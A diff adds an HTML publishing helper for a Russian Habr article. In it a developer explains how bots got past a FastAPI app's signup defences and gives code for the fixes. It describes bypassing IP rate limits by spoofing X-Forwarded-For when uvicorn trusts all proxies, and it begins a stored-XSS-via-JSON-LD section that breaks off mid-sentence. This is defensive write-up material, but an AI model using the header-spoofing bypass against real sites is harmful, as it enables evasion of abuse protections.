@@ -1,0 +1,1448 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Хабр: 176 ботов, ИИ и 334 статьи</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 760px; margin: 0 auto; padding: 1em; line-height: 1.6; color: #222; background: #fafafa; }
+  .toolbar { position: sticky; top: 0; z-index: 10; background: #fafafa; padding: 1em 0; border-bottom: 1px solid #ddd; margin-bottom: 1em; display: flex; gap: 0.6em; align-items: center; flex-wrap: wrap; }
+  .toolbar button { padding: 0.6em 1.2em; border-radius: 6px; border: none; cursor: pointer; font-weight: 600; font-size: 0.95em; transition: all 0.15s; }
+  .btn-primary { background: #1a73e8; color: white; }
+  .btn-primary:hover { background: #1557b0; }
+  .btn-primary.ok { background: #16a34a; }
+  .hint { font-size: 0.85em; color: #666; }
+  .instructions { background: #fffbea; border-left: 4px solid #f59e0b; padding: 1em 1.2em; margin: 1em 0 2em; border-radius: 4px; font-size: 0.92em; }
+  .instructions h3 { margin-top: 0; color: #92400e; font-size: 1.1em; }
+  .instructions ol { padding-left: 1.4em; margin: 0.5em 0; }
+  .checklist { background: #ecfdf5; border-left: 4px solid #10b981; padding: 1em 1.2em; margin: 1em 0 2em; border-radius: 4px; font-size: 0.92em; }
+  .checklist h3 { margin-top: 0; color: #065f46; font-size: 1.05em; }
+  .checklist ol { padding-left: 1.4em; margin: 0.5em 0; list-style: decimal; }
+  .checklist input[type="checkbox"] { margin-right: 0.4em; vertical-align: middle; }
+  .checklist code { background: #fff; padding: 0.1em 0.4em; border-radius: 3px; font-size: 0.95em; }
+  .article { background: white; padding: 2em; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
+  .article h1 { font-size: 1.8em; border-bottom: 2px solid #eee; padding-bottom: 0.3em; margin-top: 0; }
+  .article h2 { font-size: 1.4em; margin-top: 1.8em; border-bottom: 1px solid #eee; padding-bottom: 0.2em; }
+  .article h3 { font-size: 1.15em; }
+  .section-card { background: white; border-radius: 8px; padding: 1em 1.5em; margin-bottom: 1em; box-shadow: 0 1px 4px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; }
+  .section-header { display: flex; align-items: center; gap: 0.75em; padding-bottom: 0.6em; border-bottom: 1px solid #eee; margin-bottom: 1em; flex-wrap: wrap; }
+  .section-num { display: inline-flex; align-items: center; justify-content: center; width: 1.8em; height: 1.8em; background: #2563eb; color: white; border-radius: 50%; font-weight: 700; font-size: 0.85em; flex-shrink: 0; }
+  .section-title { flex: 1; font-weight: 600; min-width: 0; }
+  .btn-copy-section { padding: 0.5em 1em; border-radius: 6px; border: 1px solid #2563eb; background: white; color: #2563eb; cursor: pointer; font-weight: 600; font-size: 0.88em; transition: all 0.15s; flex-shrink: 0; }
+  .btn-copy-section:hover { background: #2563eb; color: white; }
+  .btn-copy-section.ok { background: #16a34a; color: white; border-color: #16a34a; }
+  .section-body { font-size: 0.95em; line-height: 1.6; color: #444; }
+  .section-body h2 { font-size: 1.3em; margin: 0 0 0.5em 0; color: #1e293b; }
+  .section-body p { margin: 0.5em 0; }
+  .section-body code { background: #f4f4f4; padding: 0.1em 0.3em; border-radius: 3px; }
+  .section-body a { color: #2563eb; }
+  .article code { background: #f4f4f4; padding: 0.15em 0.4em; border-radius: 3px; font-size: 0.92em; }
+  .article pre { background: #f4f4f4; padding: 1em; overflow-x: auto; border-radius: 4px; }
+  .article blockquote { border-left: 4px solid #ccc; padding-left: 1em; color: #555; margin-left: 0; }
+  .article table { border-collapse: collapse; width: 100%; }
+  .article th, .article td { border: 1px solid #ddd; padding: 0.5em 0.8em; text-align: left; }
+  .article th { background: #f4f4f4; }
+  .article a { color: #0066cc; }
+  .article ul, .article ol { padding-left: 1.4em; }
+  .article li { margin: 0.25em 0; }
+  .article hr { border: none; border-top: 1px solid #ddd; margin: 2em 0; }
+</style>
+</head>
+<body>
+
+<div class="toolbar">
+  <button id="copy-btn" class="btn-primary" onclick="copyPost()">📋 Скопировать пост</button>
+  <span class="hint">→ Вставь Ctrl+V в редактор Хабр</span>
+</div>
+
+<div class="instructions">
+<h3>Как опубликовать</h3>
+<ol>
+<li>Жми синюю кнопку <strong>«📋 Скопировать пост»</strong> сверху.</li>
+<li>В редакторе Хабр удали старый текст если был, нажми <code>Ctrl+V</code>.</li>
+<li><strong>Важная особенность:</strong> У Хабра есть режим Markdown — включите его в редакторе и вставьте исходник целиком со страницы /raw, тогда заголовки, таблицы и код приедут как есть. Кнопка «Скопировать» ниже — запасной путь для визуального редактора. После вставки загрузите шесть скриншотов из docs/habr-screenshots и поставьте их туда, где в тексте курсивом написано «Картинка: имя-файла.png» (сами эти строки удалите).</li>
+<li>Используй чек-лист ниже чтобы не забыть ни один заголовок.</li>
+</ol>
+</div>
+
+<div class="checklist">
+<h3>Чек-лист: заголовки которые нужно сделать H2 в редакторе Хабр</h3>
+<p style="margin: 0 0 0.6em 0;">После вставки найди эти заголовки (они будут как обычный текст), выдели каждый, нажми «H2» в панели форматирования:</p>
+<ol>
+<li><label><input type="checkbox" class="hl-check"> <code>Как это выглядело</code></label></li>
+<li><label><input type="checkbox" class="hl-check"> <code>Дыра первая: лимит, который обнулялся на каждом деплое</code></label></li>
+<li><label><input type="checkbox" class="hl-check"> <code>Дыра вторая: IP, который подделывается одним заголовком</code></label></li>
+<li><label><input type="checkbox" class="hl-check"> <code>Дыра третья: подтверждение почты, которое ничего не подтверждало</code></label></li>
+<li><label><input type="checkbox" class="hl-check"> <code>Что я поставил вместо</code></label></li>
+<li><label><input type="checkbox" class="hl-check"> <code>И сигнализация</code></label></li>
+<li><label><input type="checkbox" class="hl-check"> <code>Хранимый XSS через JSON-LD</code></label></li>
+</ol>
+<p style="margin: 0.6em 0 0 0; font-size: 0.85em; color: #666;">Галочки сохранятся пока ты не закроешь страницу. Клики на этой странице ничего не делают с самим постом — это просто блокнот для тебя.</p>
+</div>
+
+<div style="background: #eff6ff; border-left: 4px solid #2563eb; padding: 1em 1.2em; margin: 1em 0 2em; border-radius: 4px; font-size: 0.92em;">
+<h3 style="margin-top: 0; color: #1e40af; font-size: 1.05em;">🔥 Если ОДНА большая вставка не работает (VC.ru ругается «слишком много текста»)</h3>
+<p>Копируй по <strong>СЕКЦИЯМ</strong> ниже. Каждая секция = заголовок H2 + параграфы под ним. Жми «📋 Скопировать секцию», вставляй в редактор Хабр, после вставки выдели первую строку (заголовок) и нажми H2 в их панели. Повтори для каждой из 8 секций.</p>
+</div>
+
+<div id="sections-list">
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">1</span>
+    <span class="section-title">Введение (TL;DR + первые параграфы)</span>
+    <button class="btn-copy-section" onclick="copySection('sec-0', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-0"><h1>176 ботов, ИИ на чужом ключе и 334 статьи: как я за четыре месяца превратил todo-лист в продукт и разобрал его по швам</h1>
+<hr />
+<p>Привет, Хабр. Меня зовут Ярослав Боев, в сети — SwairIt.</p>
+<p>Четыре месяца назад я сел писать обычный todo-лист на FastAPI. Сейчас на <code>getdoday.ru</code> живёт планировщик для школьников и студентов, а рядом — ещё несколько продуктов: школьное Q&amp;A, тренажёр билетов ПДД, кабинет для репетиторов. Один монолит, 86 000 строк, 1325 тестов.</p>
+<p>А потом я открыл базу и увидел 238 новых аккаунтов. Из них почту подтвердили 62.</p>
+<p>Остальные 176 были ботами.</p>
+<p>Я полез разбираться, как они прошли мимо защиты. Разобрался. А заодно нашёл двенадцать дыр, к ботам не имевших вообще никакого отношения: хранимый XSS на публичных страницах, чужие задачи, которые отдавались по одному идентификатору, сессию, которую нельзя было погасить даже сменой пароля.</p>
+<p>И одну, из-за которой до сих пор немного стыдно: <strong>все мои лимиты по IP обходились одной строкой в HTTP-заголовке</strong>. Я проверил это на собственном проде — сорок запросов, ноль отказов.</p>
+<p>Дальше — три истории с кодом:</p>
+<ol>
+<li><strong>Боты и безопасность.</strong> Как выглядела атака, почему не сработал ни один из трёх уровней защиты и что показал сплошной аудит.</li>
+<li><strong>ИИ-помощник, который работает на ключе пользователя.</strong> Почему я не стал платить за токены сам, как это устроено — и четыре грабли, включая асинхронный генератор, молча съедавший ответы.</li>
+<li><strong>Семантическое ядро и 334 статьи.</strong> Как выглядит контентный раздел, если строить его как код: один источник правды, автопроверки и ускорение в семнадцать раз.</li>
+</ol>
+<p>Плюс короткий финал про приватность — и про то, что я выкинул из продукта не ради красоты, а потому что так велит закон.</p>
+<p>Начнём с ботов.</p>
+<p><em>Картинка: <code>s-01-blog-index.png</code> — раздел <code>/blog</code> на getdoday.ru, 334 статьи с поиском и категориями.</em></p>
+<hr />
+<h1>Часть 1. Боты, которые прошли сквозь три уровня защиты</h1></div>
+</div>
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">2</span>
+    <span class="section-title">Как это выглядело</span>
+    <button class="btn-copy-section" onclick="copySection('sec-1', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-1"><h2>Как это выглядело</h2><p>За две недели база выросла на 238 аккаунтов. Почту подтвердили 62. Остальные 176 — боты.</p>
+<p>Домены у них были показательные: <code>yahoo.com</code>, <code>hotmail.com</code>, <code>aol.com</code>, корпоративные ящики из старых утечек. А между ними — <code>sdffsd.sdd</code>, <code>flsdfmsodf.ro</code>, <code>prweorwef.com</code>. Запомните эти три, они ещё пригодятся.</p>
+<p>Сразу скажу: это не была атака на меня лично. Никто не сидел и не подбирал ключи к моему сайту. Это обычный неадресный спам форм — кто-то прогоняет список сайтов и постит во всё, что похоже на регистрацию. Ровно поэтому история и полезная: с таким встречается каждый, кто выкатил форму в интернет.</p>
+<p>Защита у меня, между прочим, была. Целых три уровня:</p>
+<ol>
+<li><strong>Honeypot</strong> — скрытое поле, которое человек не видит, а бот заполняет.</li>
+<li><strong>Ограничение частоты</strong> — пять регистраций в минуту с одного IP.</li>
+<li><strong>Подтверждение почты</strong> — письмо со ссылкой.</li>
+</ol>
+<p>Не сработал ни один. И причины у всех трёх разные, поэтому разберу каждую.</p></div>
+</div>
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">3</span>
+    <span class="section-title">Дыра первая: лимит, который обнулялся на каждом деплое</span>
+    <button class="btn-copy-section" onclick="copySection('sec-2', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-2"><h2>Дыра первая: лимит, который обнулялся на каждом деплое</h2><p>Начнём с арифметики. Пять регистраций в минуту — это 300 в час и 7200 в сутки. Уже смешно.</p>
+<p>Но настоящая проблема была не в цифре. Вот как этот лимит был устроен:</p>
+<pre><code class="language-python">_ATTEMPTS: dict[str, deque[float]] = {}
+
+def hit(key: str, *, max_calls: int, per_seconds: float) -&gt; bool:
+    now = monotonic()
+    bucket = _ATTEMPTS.setdefault(key, deque())
+    cutoff = now - per_seconds
+    while bucket and bucket[0] &lt; cutoff:
+        bucket.popleft()
+    if len(bucket) &gt;= max_calls:
+        return False
+    bucket.append(now)
+    return True
+</code></pre>
+<p>Обычный скользящий счётчик в памяти процесса. Написан аккуратно, работает как задумано.</p>
+<p>А теперь деталь, которая всё убивает: <strong>push в master перезапускает сервис</strong>. Автопулл, миграции, рестарт — примерно минута. В хороший день я делаю сорок коммитов.</p>
+<p>То есть счётчик стирался по несколько раз в час. Он не защищал ни от чего. Он просто существовал — как знак «злая собака» на калитке без собаки.</p>
+<p>Позже выяснилась ещё одна деталь: uvicorn стартует с двумя воркерами. У каждого свой словарь в памяти. Значит, фактический лимит был не пять, а десять, и в какой воркер попадёт запрос — как повезёт.</p>
+<p><strong>Мораль:</strong> счётчик в памяти процесса — защита от случайного двойного клика, а не от бота. Если состояние обязано пережить рестарт, оно живёт в базе.</p></div>
+</div>
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">4</span>
+    <span class="section-title">Дыра вторая: IP, который подделывается одним заголовком</span>
+    <button class="btn-copy-section" onclick="copySection('sec-3', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-3"><h2>Дыра вторая: IP, который подделывается одним заголовком</h2><p>А вот это самое интересное, и нашёл я это случайно. Просто решил проверить, работает ли лимит вообще.</p>
+<p>Сервис стоит за nginx. Чтобы uvicorn видел настоящий адрес клиента, а не адрес прокси, он запускается так:</p>
+<pre><code>--proxy-headers --forwarded-allow-ips='*'
+</code></pre>
+<p>Выглядит безобидно: «доверяй заголовкам от прокси». Логично же?</p>
+<p>Давайте заглянем в исходник самого uvicorn:</p>
+<pre><code class="language-python">def get_trusted_client_host(self, x_forwarded_for: str) -&gt; str:
+    x_forwarded_for_hosts = _parse_raw_hosts(x_forwarded_for)
+    if self.always_trust:
+        return x_forwarded_for_hosts[0]   # самый ЛЕВЫЙ элемент
+</code></pre>
+<p>При <code>--forwarded-allow-ips='*'</code> включается <code>always_trust</code>, и берётся <strong>самый левый</strong> элемент <code>X-Forwarded-For</code>.</p>
+<p>Теперь вспомним, как этот заголовок собирает nginx:</p>
+<pre><code class="language-nginx">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</code></pre>
+<p><code>$proxy_add_x_forwarded_for</code> — это «что прислал клиент» плюс настоящий адрес, дописанный <strong>справа</strong>. Клиент прислал <code>X-Forwarded-For: 1.2.3.4</code> — до приложения доедет <code>1.2.3.4, 93.x.x.x</code>, где второй настоящий.</p>
+<p>uvicorn берёт первый. Тот, который написал клиент.</p>
+<p>Я не поверил и пошёл проверять на живом сервере. Сорок запросов на ручку логина, несуществующий адрес, аккаунты не создаются:</p>
+<table>
+<thead>
+<tr>
+<th>Что делаю</th>
+<th>Что получаю</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Шлю фиксированный подставной <code>X-Forwarded-For: 203.0.113.7</code></td>
+<td><strong>429: 20</strong>, 401: 20 — лимит сработал. Но на подставной адрес</td>
+</tr>
+<tr>
+<td>Сразу следом меняю <code>X-Forwarded-For</code> в каждом запросе</td>
+<td><strong>429: 0</strong>, 401: 40 — лимит не сработал ни разу</td>
+</tr>
+</tbody>
+</table>
+<p>Смотрите, в чём соль второй строки. Если бы заголовок игнорировался, вторая фаза унаследовала бы уже забитый счётчик реального адреса и отдала бы 429 на первом же запросе. Она отдала ноль. Сорок раз подряд.</p>
+<p>То есть <strong>любой мой лимит по IP обходился одной строкой</strong>. Регистрация, логин, антифлуд на публичных страницах — всё.</p>
+<p>Чинится в двух местах. На сервере — правильным значением флага:</p>
+<pre><code>--forwarded-allow-ips=127.0.0.1
+</code></pre>
+<p>А в приложении я перестал зависеть от того, как именно запущен uvicorn, и стал брать адрес сам:</p>
+<pre><code class="language-python">def client_ip(request: Request) -&gt; str | None:
+    &quot;&quot;&quot;Настоящий адрес клиента, который нельзя подделать заголовком.
+
+    nginx дописывает реальный адрес СПРАВА ($proxy_add_x_forwarded_for),
+    поэтому берём последний элемент — он проставлен нашим прокси,
+    а не гостем.
+    &quot;&quot;&quot;
+    forwarded = request.headers.get(&quot;x-forwarded-for&quot;)
+    if forwarded:
+        parts = [p.strip() for p in forwarded.split(&quot;,&quot;) if p.strip()]
+        if parts:
+            return parts[-1]
+    return request.client.host if request.client else None
+</code></pre>
+<p>Честно про ограничение: «брать правый» верно ровно для одного прокси. Если перед вами цепочка вроде CDN → nginx, правым окажется адрес первого прокси — не настоящий клиент, но и не подделываемый. Огрубление, а не дыра.</p>
+<p><strong>Мораль:</strong> если приложение принимает решения по IP, оно обязано знать, какому источнику этого IP доверяет. <code>'*'</code> — это не «доверяй прокси». Это «доверяй кому угодно».</p></div>
+</div>
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">5</span>
+    <span class="section-title">Дыра третья: подтверждение почты, которое ничего не подтверждало</span>
+    <button class="btn-copy-section" onclick="copySection('sec-4', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-4"><h2>Дыра третья: подтверждение почты, которое ничего не подтверждало</h2><p>В базе была колонка <code>email_verified_at</code>. Письмо уходило, ссылка работала, дата проставлялась. Всё как у людей.</p>
+<p>Потом я поискал по проекту, где эта колонка проверяется перед доступом к функциям. И не нашёл ни одного места. Зато нашёл в сервисе аутентификации честный комментарий, который сам же когда-то и написал:</p>
+<pre><code class="language-python"># Email verification is &quot;soft&quot;: unverified users may sign in.
+</code></pre>
+<p>То есть бот регистрировался и сразу пользовался аккаунтом. Подтверждение почты было украшением. Красивым, бесполезным.</p>
+<p>Дальше я принял решение, с которым кто-то не согласится: <strong>жёсткую проверку я делать не стал</strong>. Потому что письма теряются. Падают в спам. Приходят на ящик, к которому у школьника нет доступа с телефона. Жёсткий гейт отрезал бы живых людей ради ботов, которых можно поймать дешевле.</p>
+<p>Вместо этого — автоудаление. Аккаунт, у которого разом не подтверждена почта, нет ни одной задачи, нет привязки к Telegram и профиля репетитора, через 30 дней удаляется сам.</p></div>
+</div>
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">6</span>
+    <span class="section-title">Что я поставил вместо</span>
+    <button class="btn-copy-section" onclick="copySection('sec-5', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-5"><h2>Что я поставил вместо</h2><p>Три меры. Ни одна не требует JavaScript — бот его не исполняет, а живой браузер проходит проверки и не замечает.</p>
+<p><strong>1. Подписанная метка времени формы.</strong> Кладём в форму время, когда её отрисовали. Обязательно подписанное — иначе бот просто подставит «пять секунд назад» и будет проходить всегда:</p>
+<pre><code class="language-python">def issue_form_token() -&gt; str:
+    ts = f&quot;{datetime.now(UTC).timestamp():.0f}&quot;
+    return f&quot;{ts}.{_sign(ts)}&quot;
+
+def _sign(ts: str) -&gt; str:
+    secret = get_settings().app_secret_key.encode()
+    return hmac.new(secret, f&quot;register:{ts}&quot;.encode(), hashlib.sha256).hexdigest()[:32]
+
+def check_form_timing(token: str | None) -&gt; None:
+    stale = &quot;Форма устарела, обнови страницу.&quot;
+    if not token or &quot;.&quot; not in token:
+        raise SignupRejected(stale, log_code=&quot;no_timestamp&quot;)
+
+    ts, _, signature = token.partition(&quot;.&quot;)
+    if not hmac.compare_digest(signature, _sign(ts)):
+        raise SignupRejected(stale, log_code=&quot;bad_signature&quot;)
+
+    elapsed = datetime.now(UTC).timestamp() - float(ts)
+    if elapsed &lt; MIN_FORM_SECONDS:
+        raise SignupRejected(&quot;Слишком быстро — заполни форму ещё раз.&quot;, log_code=&quot;too_fast&quot;)
+    if elapsed &gt; MAX_FORM_SECONDS:
+        raise SignupRejected(stale, log_code=&quot;expired&quot;)
+</code></pre>
+<p>Это убивает весь класс «прямой POST по списку URL». Бот либо не пришлёт метку вовсе, либо пришлёт свою — и подпись не сойдётся.</p>
+<p><strong>2. Счёт регистраций по базе, а не в памяти.</strong> У пользователя появились две колонки: <code>signup_ip</code> и <code>signup_subnet</code> — первые три октета. Подсеть здесь важнее адреса: поменять последний октет не стоит ничего.</p>
+<pre><code class="language-python">MAX_PER_IP_HOUR = 5
+MAX_PER_SUBNET_HOUR = 30
+</code></pre>
+<p>Запас нарочно щедрый, и вот почему. Моя аудитория сидит за школьным NAT и за CGNAT мобильных операторов, где сотню человек видно как один адрес. Cloudflare публиковал измерение: CGNAT-адреса попадают под ограничения втрое чаще, при этом ботов среди них <em>меньше</em>. Урок информатики, на котором класс регистрируется одновременно, не должен упереться в мой лимит — иначе я решу проблему ботов ценой живых пользователей.</p>
+<p>И отдельная защита от себя же. Если приложение видит внутренний адрес — <code>127.0.0.1</code> или что-то из приватных диапазонов, — значит прокси не проставил заголовок и настоящий клиент нам просто неизвестен. Считать всех одним человеком в такой ситуации нельзя: регистрация закроется всему сайту после пятой за час.</p>
+<pre><code class="language-python">if not ip or _is_internal(ip):
+    return
+</code></pre>
+<p><strong>3. Проверка, существует ли домен почты.</strong> Вот тут меня ждал сюрприз.</p>
+<p>Я собрался прикручивать списки одноразовых почт — классика жанра. Полез сверять со своими данными и обнаружил, что против моих ботов они бесполезны: ни один из наблюдавшихся доменов не был temp-mail.</p>
+<p>Зато помните <code>sdffsd.sdd</code>, <code>flsdfmsodf.ro</code> и <code>prweorwef.com</code>? Это NXDOMAIN. Ни MX, ни A-записи. Письмо туда физически не уйдёт — домена не существует.</p>
+<p>Одна DNS-проверка выносит их целиком:</p>
+<pre><code class="language-python">def _probe_domain(domain: str) -&gt; bool:
+    from email_validator import EmailUndeliverableError, validate_email
+
+    try:
+        validate_email(f&quot;probe@{domain}&quot;, check_deliverability=True, timeout=3)
+    except EmailUndeliverableError:
+        return False
+    except Exception:
+        # Таймаут, сбой резолвера — пропускаем. Отказать живому человеку
+        # из-за нашей же сетевой проблемы хуже, чем пропустить бота.
+        return True
+    return True
+
+_domain_has_mail = lru_cache(maxsize=4096)(_probe_domain)
+</code></pre>
+<p>Резолвер синхронный, поэтому в приложении он уезжает в отдельный поток: регистрация — не то место, где стоит блокировать event loop на секунду.</p>
+<p>Чего я делать <strong>не стал</strong> и вам не советую: отсекать адреса по признаку «много цифр подряд». У меня полно живых пользователей, у которых вместо имени ящика телефон — <code>79161234567@mail.ru</code>. Правило, которое ловит ботов вместе с людьми, хуже, чем отсутствие правила.</p></div>
+</div>
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">7</span>
+    <span class="section-title">И сигнализация</span>
+    <button class="btn-copy-section" onclick="copySection('sec-6', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-6"><h2>И сигнализация</h2><p>Те 176 ботов я заметил постфактум, разбирая базу руками. Это, если честно, обиднее всего остального.</p>
+<p>Теперь при каждой регистрации считается число аккаунтов за последний час, и если оно переваливает за двадцать — мне приходит письмо. Повторное не чаще раза в час, все ошибки внутри глушатся: сигнализация не имеет права уронить регистрацию.</p>
+<p>Самая дешёвая мера из всех и самая недооценённая. Защиту рано или поздно обойдут. А вот незамеченной волна оставаться не должна.</p>
+<hr />
+<h1>Часть 2. Аудит: двенадцать дыр, к ботам отношения не имевших</h1>
+<p>Раз уж я всё равно копался в безопасности, то прошёл проект целиком: авторизация, права доступа, платежи, хранение секретов, XSS, SSRF. Ниже — то, что стоило починить, с объяснением механики. Всё закрыто тестами.</p></div>
+</div>
+<div class="section-card">
+  <div class="section-header">
+    <span class="section-num">8</span>
+    <span class="section-title">Хранимый XSS через JSON-LD</span>
+    <button class="btn-copy-section" onclick="copySection('sec-7', this)">📋 Скопировать секцию</button>
+  </div>
+  <div class="section-body" id="sec-7"><h2>Хранимый XSS через JSON-LD</h2><p>Моя любимая находка. Красивая, как в учебнике.</p>
+<p>На публичных страницах школьного Q&amp;A стоит разметка для поисковиков:</p>
+<pre><code class="language-python">&quot;jsonld&quot;: json.dumps(jsonld, ensure_ascii=False),
+</code></pre>
+<pre><code class="language-html">&lt;script type=&quot;application/ld+json&quot;&gt;{{ jsonld | safe }}&lt;/script&gt;
+</code></pre>
+<p>Выглядит безопасно, правда? <code>json.dumps</code> экранирует кавычки и слэши, вырваться из строки нельзя.</p>
+<p>Только HTML-парсер про JSON ничего не знает. Он закрывает <code>&lt;script&gt;</code> на первой же последовательности `</p></div>
+</div>
+
+</div>
+
+<details style="margin-top: 2em; background: white; padding: 1em 1.5em; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.04);">
+<summary style="cursor: pointer; font-weight: 600; color: #1a73e8;">Запасной запасной вариант: plain text с маркерами заголовков</summary>
+<p style="margin: 1em 0 0.6em 0; font-size: 0.92em; color: #555;">
+Если совсем ничего не работает — выдели текст ниже (клик в поле → Ctrl+A → Ctrl+C) и вставь в редактор Хабр.
+Заголовки помечены ▶ <code>═══ H2: ... ═══</code> ◀ — найди каждый в редакторе, выдели, нажми H2, удали маркеры.
+</p>
+<textarea readonly id="plain-textarea" style="width: 100%; height: 400px; font-family: 'SF Mono', Consolas, monospace; font-size: 0.85em; padding: 1em; border: 1px solid #ddd; border-radius: 4px; resize: vertical; line-height: 1.5;" onclick="this.select()">176 БОТОВ, ИИ НА ЧУЖОМ КЛЮЧЕ И 334 СТАТЬИ: КАК Я ЗА ЧЕТЫРЕ МЕСЯЦА ПРЕВРАТИЛ TODO-ЛИСТ В ПРОДУКТ И РАЗОБРАЛ ЕГО ПО ШВАМ
+
+
+---
+
+Привет, Хабр. Меня зовут Ярослав Боев, в сети — SwairIt.
+
+Четыре месяца назад я сел писать обычный todo-лист на FastAPI. Сейчас на getdoday.ru живёт планировщик для школьников и студентов, а рядом — ещё несколько продуктов: школьное Q&amp;A, тренажёр билетов ПДД, кабинет для репетиторов. Один монолит, 86 000 строк, 1325 тестов.
+
+А потом я открыл базу и увидел 238 новых аккаунтов. Из них почту подтвердили 62.
+
+Остальные 176 были ботами.
+
+Я полез разбираться, как они прошли мимо защиты. Разобрался. А заодно нашёл двенадцать дыр, к ботам не имевших вообще никакого отношения: хранимый XSS на публичных страницах, чужие задачи, которые отдавались по одному идентификатору, сессию, которую нельзя было погасить даже сменой пароля.
+
+И одну, из-за которой до сих пор немного стыдно: все мои лимиты по IP обходились одной строкой в HTTP-заголовке. Я проверил это на собственном проде — сорок запросов, ноль отказов.
+
+Дальше — три истории с кодом:
+
+1. Боты и безопасность. Как выглядела атака, почему не сработал ни один из трёх уровней защиты и что показал сплошной аудит.
+2. ИИ-помощник, который работает на ключе пользователя. Почему я не стал платить за токены сам, как это устроено — и четыре грабли, включая асинхронный генератор, молча съедавший ответы.
+3. Семантическое ядро и 334 статьи. Как выглядит контентный раздел, если строить его как код: один источник правды, автопроверки и ускорение в семнадцать раз.
+
+Плюс короткий финал про приватность — и про то, что я выкинул из продукта не ради красоты, а потому что так велит закон.
+
+Начнём с ботов.
+
+Картинка: s-01-blog-index.png — раздел /blog на getdoday.ru, 334 статьи с поиском и категориями.
+
+---
+
+ЧАСТЬ 1. БОТЫ, КОТОРЫЕ ПРОШЛИ СКВОЗЬ ТРИ УРОВНЯ ЗАЩИТЫ
+
+
+
+═══ H2: Как это выглядело ═══
+
+
+За две недели база выросла на 238 аккаунтов. Почту подтвердили 62. Остальные 176 — боты.
+
+Домены у них были показательные: yahoo.com, hotmail.com, aol.com, корпоративные ящики из старых утечек. А между ними — sdffsd.sdd, flsdfmsodf.ro, prweorwef.com. Запомните эти три, они ещё пригодятся.
+
+Сразу скажу: это не была атака на меня лично. Никто не сидел и не подбирал ключи к моему сайту. Это обычный неадресный спам форм — кто-то прогоняет список сайтов и постит во всё, что похоже на регистрацию. Ровно поэтому история и полезная: с таким встречается каждый, кто выкатил форму в интернет.
+
+Защита у меня, между прочим, была. Целых три уровня:
+
+1. Honeypot — скрытое поле, которое человек не видит, а бот заполняет.
+2. Ограничение частоты — пять регистраций в минуту с одного IP.
+3. Подтверждение почты — письмо со ссылкой.
+
+Не сработал ни один. И причины у всех трёх разные, поэтому разберу каждую.
+
+
+═══ H2: Дыра первая: лимит, который обнулялся на каждом деплое ═══
+
+
+Начнём с арифметики. Пять регистраций в минуту — это 300 в час и 7200 в сутки. Уже смешно.
+
+Но настоящая проблема была не в цифре. Вот как этот лимит был устроен:
+
+`python
+_ATTEMPTS: dict[str, deque[float]] = {}
+
+def hit(key: str, *, max_calls: int, per_seconds: float) -&gt; bool:
+    now = monotonic()
+    bucket = _ATTEMPTS.setdefault(key, deque())
+    cutoff = now - per_seconds
+    while bucket and bucket[0] &lt; cutoff:
+        bucket.popleft()
+    if len(bucket) &gt;= max_calls:
+        return False
+    bucket.append(now)
+    return True
+`
+
+Обычный скользящий счётчик в памяти процесса. Написан аккуратно, работает как задумано.
+
+А теперь деталь, которая всё убивает: push в master перезапускает сервис. Автопулл, миграции, рестарт — примерно минута. В хороший день я делаю сорок коммитов.
+
+То есть счётчик стирался по несколько раз в час. Он не защищал ни от чего. Он просто существовал — как знак «злая собака» на калитке без собаки.
+
+Позже выяснилась ещё одна деталь: uvicorn стартует с двумя воркерами. У каждого свой словарь в памяти. Значит, фактический лимит был не пять, а десять, и в какой воркер попадёт запрос — как повезёт.
+
+Мораль: счётчик в памяти процесса — защита от случайного двойного клика, а не от бота. Если состояние обязано пережить рестарт, оно живёт в базе.
+
+
+═══ H2: Дыра вторая: IP, который подделывается одним заголовком ═══
+
+
+А вот это самое интересное, и нашёл я это случайно. Просто решил проверить, работает ли лимит вообще.
+
+Сервис стоит за nginx. Чтобы uvicorn видел настоящий адрес клиента, а не адрес прокси, он запускается так:
+
+`
+--proxy-headers --forwarded-allow-ips='*'
+`
+
+Выглядит безобидно: «доверяй заголовкам от прокси». Логично же?
+
+Давайте заглянем в исходник самого uvicorn:
+
+`python
+def get_trusted_client_host(self, x_forwarded_for: str) -&gt; str:
+    x_forwarded_for_hosts = _parse_raw_hosts(x_forwarded_for)
+    if self.always_trust:
+        return x_forwarded_for_hosts[0]   # самый ЛЕВЫЙ элемент
+`
+
+При --forwarded-allow-ips='*' включается always_trust, и берётся самый левый элемент X-Forwarded-For.
+
+Теперь вспомним, как этот заголовок собирает nginx:
+
+`nginx
+proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+`
+
+$proxy_add_x_forwarded_for — это «что прислал клиент» плюс настоящий адрес, дописанный справа. Клиент прислал X-Forwarded-For: 1.2.3.4 — до приложения доедет 1.2.3.4, 93.x.x.x, где второй настоящий.
+
+uvicorn берёт первый. Тот, который написал клиент.
+
+Я не поверил и пошёл проверять на живом сервере. Сорок запросов на ручку логина, несуществующий адрес, аккаунты не создаются:
+
+| Что делаю | Что получаю |
+|---|---|
+| Шлю фиксированный подставной X-Forwarded-For: 203.0.113.7 | 429: 20, 401: 20 — лимит сработал. Но на подставной адрес |
